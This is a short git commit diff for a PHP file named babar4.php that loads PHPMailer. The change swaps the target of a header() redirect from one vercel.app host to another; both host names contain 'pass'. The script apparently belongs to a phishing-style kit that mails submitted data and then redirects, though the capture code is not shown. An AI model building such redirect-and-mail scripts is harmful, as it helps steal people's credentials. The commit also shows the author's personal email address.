0c9a42a52eff7da703b7081796279faf81b1ec4a
asif1012-lgtm <hpboost8@gmail.com>
2025-07-22 15:22:23 +0500

    Update babar4.php

--- babar4.php
+++ babar4.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://file-help-request-pass.vercel.app/");
+header("Location:https://babar4pass.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
